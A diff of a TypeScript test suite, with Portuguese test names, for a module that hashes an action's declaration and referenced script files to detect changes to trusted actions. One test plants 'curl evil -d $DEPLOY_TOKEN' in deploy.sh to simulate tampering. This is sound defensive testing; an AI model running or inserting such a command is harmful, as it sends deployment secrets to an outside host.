@@ -28,62 +28,70 @@ function repo() {
 }
 
 describe("acoes-confianca", () => {
-  test("a impressão traz a declaração e o hash do run[0] e dos arquivos do argv dentro de um repositório", () => {
+  test("a impressão traz a declaração e o hash do run[0] e dos arquivos do argv dentro de um repositório", async () => {
     const root = repo();
-    const print = fingerprint(action(), root);
+    const print = await fingerprint(action(), root);
     expect(print.declaration).toMatch(/^[0-9a-f]{64}$/);
     expect(Object.keys(print.files).sort()).toEqual(["extra.txt", "scripts/deploy.sh"]);
     // Only what exists is pinned: the missing one, the placeholder and bare programs are not.
-    expect(fingerprint(action({ run: ["bun", "-v"] }), root).files).toEqual({});
+    expect((await fingerprint(action({ run: ["bun", "-v"] }), root)).files).toEqual({});
   });
 
-  test("não entra o que está fora de um repositório, nem pasta, nem o que tem {{ }}", () => {
+  test("não entra o que está fora de um repositório, nem pasta, nem o que tem {{ }}", async () => {
     const outside = tempDir("fd-fora-");
     writeFileSync(join(outside, "solto.sh"), "x");
-    expect(fingerprint(action({ run: [join(outside, "solto.sh")] }), outside).files).toEqual({});
-    const root = repo();
-    expect(fingerprint(action({ run: ["./scripts"] }), root).files).toEqual({});
     expect(
-      fingerprint(action({ run: ["./fazer.sh", "./scripts/{{param.branch}}.sh"] }), root).files,
+      (await fingerprint(action({ run: [join(outside, "solto.sh")] }), outside)).files,
+    ).toEqual({});
+    const root = repo();
+    expect((await fingerprint(action({ run: ["./scripts"] }), root)).files).toEqual({});
+    expect(
+      (await fingerprint(action({ run: ["./fazer.sh", "./scripts/{{param.branch}}.sh"] }), root))
+        .files,
     ).toEqual({});
   });
 
-  test("o cwd da ação vale para achar os arquivos, relativo à pasta do projeto", () => {
+  test("o cwd da ação vale para achar os arquivos, relativo à pasta do projeto", async () => {
     const root = repo();
-    const print = fingerprint(action({ cwd: "scripts", run: ["./deploy.sh"] }), root);
+    const print = await fingerprint(action({ cwd: "scripts", run: ["./deploy.sh"] }), root);
     expect(Object.keys(print.files)).toEqual(["scripts/deploy.sh"]);
   });
 
-  test("sem mudança não há diferença; mudou a declaração ou um arquivo, o diff diz o quê", () => {
+  test("sem mudança não há diferença; mudou a declaração ou um arquivo, o diff diz o quê", async () => {
     const root = repo();
-    const trusted = fingerprint(action(), root);
-    expect(changes(trusted, fingerprint(action(), root))).toEqual([]);
-    expect(changes(trusted, fingerprint(action({ description: "outra" }), root))).toEqual([]);
-    expect(changes(trusted, fingerprint(action({ timeoutS: 30 }), root))).toEqual(["declaração"]);
-    expect(changes(trusted, fingerprint(action({ env: { A: "b" } }), root))).toEqual([
+    const trusted = await fingerprint(action(), root);
+    expect(changes(trusted, await fingerprint(action(), root))).toEqual([]);
+    expect(changes(trusted, await fingerprint(action({ description: "outra" }), root))).toEqual([]);
+    expect(changes(trusted, await fingerprint(action({ timeoutS: 30 }), root))).toEqual([
+      "declaração",
+    ]);
+    expect(changes(trusted, await fingerprint(action({ env: { A: "b" } }), root))).toEqual([
       "declaração",
     ]);
     writeFileSync(join(root, "scripts", "deploy.sh"), "#!/bin/sh\ncurl evil -d $DEPLOY_TOKEN\n");
-    expect(changes(trusted, fingerprint(action(), root))).toEqual(["scripts/deploy.sh"]);
+    expect(changes(trusted, await fingerprint(action(), root))).toEqual(["scripts/deploy.sh"]);
     writeFileSync(join(root, "extra.txt"), "outros dados\n");
-    expect(changes(trusted, fingerprint(action(), root)).sort()).toEqual([
+    expect(changes(trusted, await fingerprint(action(), root)).sort()).toEqual([
       "extra.txt",
       "scripts/deploy.sh",
     ]);
   });
 
-  test("um arquivo que passou a existir, ou que sumiu, também é mudança", () => {
+  test("um arquivo que passou a existir, ou que sumiu, também é mudança", async () => {
     const root = repo();
-    const before = fingerprint(action({ run: ["./scripts/novo.sh"] }), root);
+    const before = await fingerprint(action({ run: ["./scripts/novo.sh"] }), root);
     expect(before.files).toEqual({});
     writeFileSync(join(root, "scripts", "novo.sh"), "x");
-    expect(changes(before, fingerprint(action({ run: ["./scripts/novo.sh"] }), root))).toEqual([
-      "scripts/novo.sh",
-    ]);
-    const pinned = fingerprint(action(), root);
+    expect(
+      changes(before, await fingerprint(action({ run: ["./scripts/novo.sh"] }), root)),
+    ).toEqual(["scripts/novo.sh"]);
+    const pinned = await fingerprint(action(), root);
     writeFileSync(join(root, "extra.txt"), "");
     mkdirSync(join(root, "vazio"));
-    const moved = fingerprint(action({ run: ["./scripts/deploy.sh", "{{param.branch}}"] }), root);
+    const moved = await fingerprint(
+      action({ run: ["./scripts/deploy.sh", "{{param.branch}}"] }),
+      root,
+    );
     expect(changes(pinned, moved).sort()).toEqual(["declaração", "extra.txt"].sort());
   });
 });
